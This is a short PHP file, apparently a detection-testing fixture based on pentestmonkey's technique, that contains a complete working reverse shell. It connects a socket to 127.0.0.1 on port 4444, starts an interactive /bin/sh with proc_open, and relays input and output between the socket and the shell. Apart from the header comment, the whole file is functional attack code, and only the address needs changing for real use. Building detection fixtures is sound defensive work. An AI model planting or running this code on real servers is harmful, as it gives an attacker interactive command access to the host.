<?php
// php-reverse-shell - minimal fixture for detection testing
// Based on technique by pentestmonkey@pentestmonkey.net
$ip   = '127.0.0.1';
$port = 4444;
$shell = '/bin/sh -i';
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
$descriptorspec = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
$process = proc_open($shell, $descriptorspec, $pipes);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($sock, 0);
while (1) {
    $read_a = [$sock, $pipes[1], $pipes[2]];
    $num = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) { fwrite($pipes[0], fread($sock, 1400)); }
    if (in_array($pipes[1], $read_a)) { fwrite($sock, fread($pipes[1], 1400)); }
}
proc_close($process);
